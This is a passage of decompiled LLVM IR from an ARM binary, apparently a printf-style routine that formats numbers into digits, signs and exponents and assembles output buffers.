  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1462c

bb239:                                            ; preds = %dec_label_pc_142e8
  %v2_142fc = icmp eq i1 %v4_142ec, false
  store i1 %v2_142fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142fc, label %dec_label_pc_1462c, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_14300 = sub i32 %v1_142e8, %v0_142e8
  store i32 %v3_14300, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1431c

dec_label_pc_14310:                               ; preds = %bb236
  %v0_14310 = load i32, i32* %sb.global-to-local, align 4
  %v7_14310 = icmp eq i32 %v0_14310, 102
  store i1 %v7_14310, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14310, i32* %r8.global-to-local, align 4
  br i1 %v7_14310, label %dec_label_pc_14310.dec_label_pc_1431c_crit_edge, label %dec_label_pc_1432c

dec_label_pc_14310.dec_label_pc_1431c_crit_edge:  ; preds = %dec_label_pc_14310
  %v0_1431c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %.thread24, %dec_label_pc_14310.dec_label_pc_1431c_crit_edge
  %v0_1431c = phi i32 [ %v0_1431c.pre, %dec_label_pc_14310.dec_label_pc_1431c_crit_edge ], [ %v0_142e8, %.thread24 ]
  %v1_1431c = icmp slt i32 %v0_1431c, 0
  %v2_1431c = icmp eq i32 %v0_1431c, 0
  store i1 %v2_1431c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1431c, label %bb240, label %dec_label_pc_1432c

bb240:                                            ; preds = %dec_label_pc_1431c
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_14324 = load i32, i32* %r2.global-to-local, align 4
  %v6_14324 = add i32 %v5_14324, -1
  %v7_14324 = inttoptr i32 %v6_14324 to i8*
  store i8 48, i8* %v7_14324, align 1
  %v8_14324 = load i32, i32* %r2.global-to-local, align 4
  %v9_14324 = add i32 %v8_14324, -1
  store i32 %v9_14324, i32* %r2.global-to-local, align 4
  %v0_14328.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1435c.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %bb240, %dec_label_pc_1431c, %dec_label_pc_1462c, %dec_label_pc_14310
  %v1_1435c = phi i32 [ %v1_142e0, %dec_label_pc_14310 ], [ %v1_142e0, %dec_label_pc_1462c ], [ %v1_1435c.pre.pre, %bb240 ], [ %v1_142e0, %dec_label_pc_1431c ]
  %v1_143d430 = phi i32 [ 0, %dec_label_pc_14310 ], [ 0, %dec_label_pc_1462c ], [ %v0_14328.pre, %bb240 ], [ %v0_1431c, %dec_label_pc_1431c ]
  store i32 %v1_143d430, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_14338 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_14338, i32* %r3.global-to-local, align 4
  %v0_14344 = load i32, i32* %r2.global-to-local, align 4
  %v1_14344 = inttoptr i32 %v0_14344 to i8*
  %v2_14344 = load i8, i8* %v1_14344, align 1
  %v3_14344 = zext i8 %v2_14344 to i32
  store i32 %v3_14344, i32* %r3.global-to-local, align 4
  %v5_14344 = add i32 %v0_14344, 1
  store i32 %v5_14344, i32* %r2.global-to-local, align 4
  %v1_14348 = icmp slt i32 %v1_143d430, 0
  %v2_14348 = icmp eq i32 %v1_143d430, 0
  store i1 %v2_14348, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_14344, i32* %r6.global-to-local, align 4
  store i32 %v3_14344, i32* %stack_var_-42, align 4
  %v2_1435c = sub i32 %v1_1435c, %v5_14344
  store i32 %v2_1435c, i32* %ip.global-to-local, align 4
  br i1 %v1_14348, label %.thread, label %dec_label_pc_14368

.thread:                                          ; preds = %dec_label_pc_1432c
  %v5_14360 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_14360, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_143e4

dec_label_pc_14368:                               ; preds = %dec_label_pc_1432c
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1436c = sub i32 %v1_143d430, %v2_1435c
  %v4_1436c = xor i32 %v2_1435c, %v1_143d430
  %v5_1436c = xor i32 %v2_1436c, %v1_143d430
  %v6_1436c = and i32 %v5_1436c, %v4_1436c
  %v7_1436c = icmp slt i32 %v6_1436c, 0
  %v8_1436c = icmp slt i32 %v2_1436c, 0
  %v9_1436c = icmp eq i32 %v1_143d430, %v2_1435c
  store i1 %v9_1436c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_14378 = xor i1 %v8_1436c, %v7_1436c
  br i1 %v2_14378, label %dec_label_pc_143c4, label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %dec_label_pc_14368
  store i32 %v2_1436c, i32* %r2.global-to-local, align 4
  %v2_14380 = icmp eq i32 %v2_1436c, 0
  store i1 %v2_14380, i1* %cpsr_z.global-to-local, align 1
  %v2_14384 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_14384, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_1436c, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_14398

.thread148:                                       ; preds = %dec_label_pc_1437c
  %v7_1438c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_1438c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_14398:                               ; preds = %dec_label_pc_1437c
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34077), i32* %r3.global-to-local, align 4
  %v2_143a8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_143a8, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_143e4

dec_label_pc_143c4:                               ; preds = %dec_label_pc_14368
  store i1 %v2_14348, i1* %cpsr_z.global-to-local, align 1
  %v2_143c8 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_143c8, i32* %lr.global-to-local, align 4
  br i1 %v2_14348, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_143c4
  %v3_143d0 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_143d0, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_143c4
  %v3_143d4 = sub i32 %v2_1435c, %v1_143d430
  store i32 %v3_143d4, i32* %ip.global-to-local, align 4
  %v3_143d863 = add i32 %v5_14344, %v1_143d430
  store i32 %v3_143d863, i32* %r6.global-to-local, align 4
  %v3_143dc = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_143dc, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_14424265 = phi i32 [ %v3_143d0, %bb242 ], [ %v3_143dc, %bb243 ], [ %v7_1438c, %.thread148 ]
  %v0_143f8102 = phi i32 [ %v2_1435c, %bb242 ], [ %v3_143d4, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_143e4

dec_label_pc_143e4:                               ; preds = %.thread, %dec_label_pc_14398, %.thread34
  %v1_14424 = phi i32 [ %v2_143a8, %dec_label_pc_14398 ], [ %v1_14424265, %.thread34 ], [ %v5_14360, %.thread ]
  %v0_14438109 = phi i32 [ -1, %dec_label_pc_14398 ], [ -1, %.thread34 ], [ %v1_143d430, %.thread ]
  %v0_143f8 = phi i32 [ 0, %dec_label_pc_14398 ], [ %v0_143f8102, %.thread34 ], [ %v2_1435c, %.thread ]
  %v3_143e4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_143e4, i32* %r2.global-to-local, align 4
  %v1_143e8 = add i32 %v3_143e4, 12
  %v2_143e8 = inttoptr i32 %v1_143e8 to i32*
  %v3_143e8 = load i32, i32* %v2_143e8, align 4
  %v1_143ec = and i32 %v3_143e8, 16
  store i32 %v1_143ec, i32* %r4.global-to-local, align 4
  %v2_143ec = icmp eq i32 %v1_143ec, 0
  %tmp270 = zext i1 %v2_143ec to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_143f8 = icmp eq i32 %v0_143f8, 0
  store i1 %v2_143f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143f8, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_143e4
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14414

bb246:                                            ; preds = %dec_label_pc_143e4
  store i1 %v2_143ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143ec, label %dec_label_pc_14408, label %dec_label_pc_14414

dec_label_pc_14408:                               ; preds = %bb246
  %v0_14408 = load i32, i32* %sb.global-to-local, align 4
  %v7_14408 = icmp eq i32 %v0_14408, 103
  store i1 %v7_14408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14408, label %dec_label_pc_14438, label %bb247

bb247:                                            ; preds = %dec_label_pc_14408
  %v1_1440c = load i32, i32* %fp.global-to-local, align 4
  %v3_1440c = icmp eq i32 %v1_1440c, 0
  store i1 %v3_1440c, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_1440c, 1
  br i1 %tmp248, label %dec_label_pc_14438, label %dec_label_pc_14414

dec_label_pc_14414:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34080), i32* %r3.global-to-local, align 4
  %v2_14424 = inttoptr i32 %v1_14424 to i32*
  store i32 112, i32* %v2_14424, align 4
  %v0_14428 = load i32, i32* %r3.global-to-local, align 4
  %v1_14428 = add i32 %v0_14428, 16
  store i32 %v1_14428, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_14430 = load i32, i32* %r7.global-to-local, align 4
  %v1_14430 = add i32 %v0_14430, 4
  %v2_14430 = inttoptr i32 %v1_14430 to i32*
  store i32 1, i32* %v2_14430, align 4
  %v4_14430 = add i32 %v0_14430, 8
  %v5_14430 = inttoptr i32 %v4_14430 to i32*
  %v6_14430 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_14430, i32* %v5_14430, align 4
  %v0_14434 = load i32, i32* %r7.global-to-local, align 4
  %v1_14434 = add i32 %v0_14434, 12
  store i32 %v1_14434, i32* %r7.global-to-local, align 4
  %v0_14438.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14438

dec_label_pc_14438:                               ; preds = %dec_label_pc_14408, %bb247, %dec_label_pc_14414
  %v1_14458 = phi i32 [ %v1_14424, %bb247 ], [ %v1_14434, %dec_label_pc_14414 ], [ %v1_14424, %dec_label_pc_14408 ]
  %v0_14438 = phi i32 [ %v0_14438109, %bb247 ], [ %v0_14438.pre, %dec_label_pc_14414 ], [ %v0_14438109, %dec_label_pc_14408 ]
  %v1_14438 = add i32 %v0_14438, 1
  store i32 %v1_14438, i32* %lr.global-to-local, align 4
  %v6_14438 = icmp slt i32 %v1_14438, 0
  %v7_14438 = icmp eq i32 %v1_14438, 0
  store i1 %v7_14438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_14438, label %dec_label_pc_14440, label %dec_label_pc_14464

dec_label_pc_14440:                               ; preds = %dec_label_pc_14438
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34077), i32* %r3.global-to-local, align 4
  %v1_14450 = sub i32 -1, %v0_14438
  store i32 %v1_14450, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_14458 = inttoptr i32 %v1_14458 to i32*
  store i32 176, i32* %v2_14458, align 4
  %v0_1445c = load i32, i32* %r7.global-to-local, align 4
  %v1_1445c = add i32 %v0_1445c, 4
  %v2_1445c = inttoptr i32 %v1_1445c to i32*
  %v3_1445c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1445c, i32* %v2_1445c, align 4
  %v4_1445c = add i32 %v0_1445c, 8
  %v5_1445c = inttoptr i32 %v4_1445c to i32*
  %v6_1445c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1445c, i32* %v5_1445c, align 4
  %v0_14460 = load i32, i32* %r7.global-to-local, align 4
  %v1_14460 = add i32 %v0_14460, 12
  store i32 %v1_14460, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14464

dec_label_pc_14464:                               ; preds = %dec_label_pc_14438, %dec_label_pc_14440
  %v2_1446c = phi i32 [ %v1_14458, %dec_label_pc_14438 ], [ %v1_14460, %dec_label_pc_14440 ]
  %v0_14464 = load i32, i32* %ip.global-to-local, align 4
  %v2_14464 = icmp eq i32 %v0_14464, 0
  store i1 %v2_14464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14464, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_14464
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1446c = inttoptr i32 %v2_1446c to i32*
  store i32 112, i32* %v3_1446c, align 4
  %v1_14470 = load i32, i32* %r6.global-to-local, align 4
  %v2_14470 = load i32, i32* %r7.global-to-local, align 4
  %v3_14470 = add i32 %v2_14470, 8
  %v4_14470 = inttoptr i32 %v3_14470 to i32*
  store i32 %v1_14470, i32* %v4_14470, align 4
  %v1_14474 = load i32, i32* %ip.global-to-local, align 4
  %v2_14474 = load i32, i32* %r7.global-to-local, align 4
  %v3_14474 = add i32 %v2_14474, 4
  %v4_14474 = inttoptr i32 %v3_14474 to i32*
  store i32 %v1_14474, i32* %v4_14474, align 4
  %v1_14478 = load i32, i32* %r7.global-to-local, align 4
  %v2_14478 = add i32 %v1_14478, 12
  store i32 %v2_14478, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_14464, %bb249
  %v1_144b0 = phi i32 [ %v2_1446c, %dec_label_pc_14464 ], [ %v2_14478, %bb249 ]
  %v0_1447c = load i32, i32* %sb.global-to-local, align 4
  %v7_1447c = icmp eq i32 %v0_1447c, 103
  store i1 %v7_1447c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1447c, label %dec_label_pc_14484, label %dec_label_pc_1448c

dec_label_pc_14484:                               ; preds = %.thread46
  %v0_14484 = load i32, i32* %r4.global-to-local, align 4
  %v2_14484 = icmp eq i32 %v0_14484, 0
  store i1 %v2_14484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14484, label %dec_label_pc_144bc, label %dec_label_pc_1448c

dec_label_pc_1448c:                               ; preds = %.thread46, %dec_label_pc_14484
  %v0_1448c = load i32, i32* %lr.global-to-local, align 4
  %v1_1448c = load i32, i32* %ip.global-to-local, align 4
  %v2_1448c = sub i32 %v1_1448c, %v0_1448c
  store i32 %v2_1448c, i32* %r1.global-to-local, align 4
  %v1_14490 = load i32, i32* %fp.global-to-local, align 4
  %v2_14490 = sub i32 %v2_1448c, %v1_14490
  %v4_14490 = xor i32 %v1_14490, %v2_1448c
  %v5_14490 = xor i32 %v2_14490, %v2_1448c
  %v6_14490 = and i32 %v5_14490, %v4_14490
  %v7_14490 = icmp slt i32 %v6_14490, 0
  %v8_14490 = icmp slt i32 %v2_14490, 0
  %v9_14490 = icmp eq i32 %v2_1448c, %v1_14490
  store i1 %v9_14490, i1* %cpsr_z.global-to-local, align 1
  %v2_14494 = xor i1 %v8_14490, %v7_14490
  br i1 %v2_14494, label %dec_label_pc_14498, label %dec_label_pc_144bc

dec_label_pc_14498:                               ; preds = %dec_label_pc_1448c
  %v2_144a4 = sub i32 %v1_14490, %v2_1448c
  store i32 %v2_144a4, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34077), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_144b0 = inttoptr i32 %v1_144b0 to i32*
  store i32 176, i32* %v2_144b0, align 4
  %v0_144b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_144b4 = add i32 %v0_144b4, 4
  %v2_144b4 = inttoptr i32 %v1_144b4 to i32*
  %v3_144b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_144b4, i32* %v2_144b4, align 4
  %v4_144b4 = add i32 %v0_144b4, 8
  %v5_144b4 = inttoptr i32 %v4_144b4 to i32*
  %v6_144b4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_144b4, i32* %v5_144b4, align 4
  %v0_144b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_144b8 = add i32 %v0_144b8, 12
  store i32 %v1_144b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_144bc

dec_label_pc_144bc:                               ; preds = %dec_label_pc_1448c, %dec_label_pc_14484, %dec_label_pc_14498
  %v1_14550.pre.pre = phi i32 [ %v1_144b0, %dec_label_pc_1448c ], [ %v1_144b0, %dec_label_pc_14484 ], [ %v1_144b8, %dec_label_pc_14498 ]
  %v0_144bc = load i32, i32* %r8.global-to-local, align 4
  %v7_144bc = icmp eq i32 %v0_144bc, 102
  store i1 %v7_144bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_144bc, label %dec_label_pc_14544, label %dec_label_pc_144c4

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144bc
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_144c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_144c8 = icmp slt i32 %v0_144c8, 0
  %v2_144c8 = icmp eq i32 %v0_144c8, 0
  store i1 %v2_144c8, i1* %cpsr_z.global-to-local, align 1
  %v4_144cc = select i1 %tmp275, i32 %v4_141e8126130, i32 101
  store i32 %v4_144cc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_144dc = sub i32 0, %v0_144c8
  %storemerge158 = select i1 %v1_144c8, i32 %v4_144dc, i32 %v0_144c8
  %tmp271 = ashr i32 %v0_144c8, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_144e4 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_144e4, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_144ec

dec_label_pc_144ec:                               ; preds = %dec_label_pc_1451c, %dec_label_pc_144ec, %dec_label_pc_144c4
  %v2_14504 = phi i32 [ %v2_144e4, %dec_label_pc_144c4 ], [ %v6_14504, %dec_label_pc_144ec ], [ %v6_14504, %dec_label_pc_1451c ]
  %v0_144fc = phi i32 [ %storemerge158, %dec_label_pc_144c4 ], [ %v2_14508, %dec_label_pc_144ec ], [ %v2_14508, %dec_label_pc_1451c ]
  %v3_144f4 = urem i32 %v0_144fc, 10
  %v1_144f8 = or i32 %v3_144f4, 48
  store i32 %v1_144f8, i32* %r3.global-to-local, align 4
  store i32 %v0_144fc, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14504 = trunc i32 %v1_144f8 to i8
  %v3_14504 = add i32 %v2_14504, -1
  %v4_14504 = inttoptr i32 %v3_14504 to i8*
  store i8 %v1_14504, i8* %v4_14504, align 1
  %v5_14504 = load i32, i32* %r6.global-to-local, align 4
  %v6_14504 = add i32 %v5_14504, -1
  store i32 %v6_14504, i32* %r6.global-to-local, align 4
  %v0_14508 = load i32, i32* %r0.global-to-local, align 4
  %v1_14508 = load i32, i32* %r1.global-to-local, align 4
  %v2_14508 = sdiv i32 %v0_14508, %v1_14508
  store i32 %v2_14508, i32* %r0.global-to-local, align 4
  %v0_1450c = load i32, i32* %r8.global-to-local, align 4
  %v1_1450c = add i32 %v0_1450c, 1
  store i32 %v1_1450c, i32* %r8.global-to-local, align 4
  %v7_14510 = icmp eq i32 %v1_1450c, 3
  store i1 %v7_14510, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14508, i32* %r5.global-to-local, align 4
  br i1 %v7_14510, label %dec_label_pc_144ec, label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %dec_label_pc_144ec
  %v2_1451c = icmp eq i32 %v2_14508, 0
  store i1 %v2_1451c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1451c, label %dec_label_pc_14524, label %dec_label_pc_144ec

dec_label_pc_14524:                               ; preds = %dec_label_pc_1451c
  %v1_14524 = add i32 %v5_14504, -2
  store i32 %v1_14524, i32* %r3.global-to-local, align 4
  %v0_14528 = load i32, i32* %sl.global-to-local, align 4
  %v1_14528 = trunc i32 %v0_14528 to i8
  %v4_14528 = inttoptr i32 %v1_14524 to i8*
  store i8 %v1_14528, i8* %v4_14528, align 1
  %v0_1452c = load i32, i32* %r3.global-to-local, align 4
  %v1_1452c = add i32 %v0_1452c, -1
  store i32 %v1_1452c, i32* %r2.global-to-local, align 4
  %v0_14530 = load i32, i32* %r4.global-to-local, align 4
  %v1_14530 = trunc i32 %v0_14530 to i8
  %v4_14530 = inttoptr i32 %v1_1452c to i8*
  store i8 %v1_14530, i8* %v4_14530, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_14538 = load i32, i32* %r7.global-to-local, align 4
  %v1_14538 = inttoptr i32 %v0_14538 to i32*
  store i32 112, i32* %v1_14538, align 4
  %v3_14538 = add i32 %v0_14538, 4
  %v4_14538 = inttoptr i32 %v3_14538 to i32*
  %v5_14538 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_14538, i32* %v4_14538, align 4
  %v0_1453c = load i32, i32* %r2.global-to-local, align 4
  %v1_1453c = load i32, i32* %r7.global-to-local, align 4
  %v2_1453c = add i32 %v1_1453c, 8
  %v3_1453c = inttoptr i32 %v2_1453c to i32*
  store i32 %v0_1453c, i32* %v3_1453c, align 4
  %v0_14540 = load i32, i32* %r7.global-to-local, align 4
  %v1_14540 = add i32 %v0_14540, 12
  store i32 %v1_14540, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14544

dec_label_pc_14544:                               ; preds = %dec_label_pc_144bc, %.thread124, %dec_label_pc_14524
  %v1_14550.pre = phi i32 [ %v2_1401c, %.thread124 ], [ %v1_14540, %dec_label_pc_14524 ], [ %v1_14550.pre.pre, %dec_label_pc_144bc ]
  %v2_14544 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_14544, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14548

dec_label_pc_14548:                               ; preds = %dec_label_pc_14548, %dec_label_pc_14544
  %v0_14548 = phi i32 [ %v2_14544, %dec_label_pc_14544 ], [ %v4_14548, %dec_label_pc_14548 ]
  %stack_var_-188.0 = phi i32 [ %v3_13eb8, %dec_label_pc_14544 ], [ %v2_14554, %dec_label_pc_14548 ]
  %v1_14548 = inttoptr i32 %v0_14548 to i32*
  %v2_14548 = load i32, i32* %v1_14548, align 4
  store i32 %v2_14548, i32* %r3.global-to-local, align 4
  %v4_14548 = add i32 %v0_14548, 12
  store i32 %v4_14548, i32* %r2.global-to-local, align 4
  %v3_14550 = icmp ult i32 %v4_14548, %v1_14550.pre
  %v2_14554 = sub i32 %stack_var_-188.0, %v2_14548
  store i32 %v2_14554, i32* %ip.global-to-local, align 4
  br i1 %v3_14550, label %dec_label_pc_14548, label %dec_label_pc_14560

dec_label_pc_14560:                               ; preds = %dec_label_pc_14548
  %v3_14560 = load i8, i8* %stack_var_-46, align 1
  %v4_14560 = sext i8 %v3_14560 to i32
  store i32 %v4_14560, i32* %r3.global-to-local, align 4
  store i32 %v4_14560, i32* %r2.global-to-local, align 4
  %v2_14564 = icmp eq i8 %v3_14560, 0
  store i1 %v2_14564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14564, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_14560
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_14560, %bb253
  %v1_145c4 = phi i32 [ %v4_14560, %dec_label_pc_14560 ], [ 1, %bb253 ]
  %v2_1456c = sub i32 %v2_14554, %v1_145c4
  store i32 %v2_1456c, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_14574 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_14574, i32* %r3.global-to-local, align 4
  %v2_14578 = icmp eq i32 %v2_1456c, 0
  store i1 %v2_14578, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_1456c, 1
  br i1 %tmp255, label %dec_label_pc_145e0, label %dec_label_pc_1458c

dec_label_pc_1458c:                               ; preds = %bb254
  %v3_1458c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1458c, i32* %lr.global-to-local, align 4
  %v1_14590 = add i32 %v3_1458c, 12
  %v2_14590 = inttoptr i32 %v1_14590 to i32*
  %v3_14590 = load i32, i32* %v2_14590, align 4
  store i32 %v3_14590, i32* %r3.global-to-local, align 4
  %v1_14594 = and i32 %v3_14590, 8
  %v2_14594 = icmp eq i32 %v1_14594, 0
  store i1 %v2_14594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14594, label %dec_label_pc_145b8, label %dec_label_pc_1459c

dec_label_pc_1459c:                               ; preds = %dec_label_pc_1458c
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34077), i32* %r3.global-to-local, align 4
  %v1_145ac = add i32 %v1_14550.pre, 12
  store i32 %v1_145ac, i32* %r6.global-to-local, align 4
  %v1_145b0 = inttoptr i32 %v1_14550.pre to i32*
  store i32 160, i32* %v1_145b0, align 4
  %v3_145b0 = add i32 %v1_14550.pre, 4
  %v4_145b0 = inttoptr i32 %v3_145b0 to i32*
  %v5_145b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_145b0, i32* %v4_145b0, align 4
  %v6_145b0 = add i32 %v1_14550.pre, 8
  %v7_145b0 = inttoptr i32 %v6_145b0 to i32*
  %v8_145b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_145b0, i32* %v7_145b0, align 4
  br label %dec_label_pc_145e4

dec_label_pc_145b8:                               ; preds = %dec_label_pc_1458c
  store i32 %v3_1458c, i32* %ip.global-to-local, align 4
  %v1_145bc = add i32 %v3_1458c, 16
  %v2_145bc = inttoptr i32 %v1_145bc to i32*
  %v3_145bc = load i32, i32* %v2_145bc, align 4
  store i32 %v3_145bc, i32* %r3.global-to-local, align 4
  %v7_145c0 = icmp eq i32 %v3_145bc, 48
  store i1 %v7_145c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_145c0, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_145b8
  store i32 %v2_14554, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145e0

.thread54.thread70:                               ; preds = %dec_label_pc_145b8
  %v4_145cc = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_14550.pre, i32* %r6.global-to-local, align 4
  %v3_145d4 = add i32 %v4_145cc, %v2_1456c
  store i32 %v3_145d4, i32* %r3.global-to-local, align 4
  store i32 %v3_145d4, i32* %stack_var_-164, align 4
  br label %dec_label_pc_145e4

dec_label_pc_145e0:                               ; preds = %bb256, %bb254
  store i32 %v1_14550.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145e4

dec_label_pc_145e4:                               ; preds = %.thread54.thread70, %dec_label_pc_1459c, %dec_label_pc_145e0
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_145e8 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_145e8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_145ec

dec_label_pc_145ec:                               ; preds = %dec_label_pc_14614, %dec_label_pc_145e4
  %v0_145ec = phi i32 [ %v1_14608, %dec_label_pc_14614 ], [ %v2_145e8, %dec_label_pc_145e4 ]
  %v1_145ec = inttoptr i32 %v0_145ec to i32*
  %v2_145ec = load i32, i32* %v1_145ec, align 4
  store i32 %v2_145ec, i32* %r1.global-to-local, align 4
  %v3_145ec = add i32 %v0_145ec, 4
  %v4_145ec = inttoptr i32 %v3_145ec to i32*
  %v5_145ec = load i32, i32* %v4_145ec, align 4
  store i32 %v5_145ec, i32* %r2.global-to-local, align 4
  %v6_145ec = add i32 %v0_145ec, 8
  %v7_145ec = inttoptr i32 %v6_145ec to i32*
  %v8_145ec = load i32, i32* %v7_145ec, align 4
  store i32 %v8_145ec, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 83456, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_14600 = load i32, i32* %r5.global-to-local, align 4
  %v1_14600 = add i32 %v0_14600, 4
  %v2_14600 = inttoptr i32 %v1_14600 to i32*
  %v3_14600 = load i32, i32* %v2_14600, align 4
  store i32 %v3_14600, i32* %r3.global-to-local, align 4
  %v0_14604 = load i32, i32* %r0.global-to-local, align 4
  %v9_14604 = icmp eq i32 %v0_14604, %v3_14600
  store i1 %v9_14604, i1* %cpsr_z.global-to-local, align 1
  %v1_14608 = add i32 %v0_14600, 12
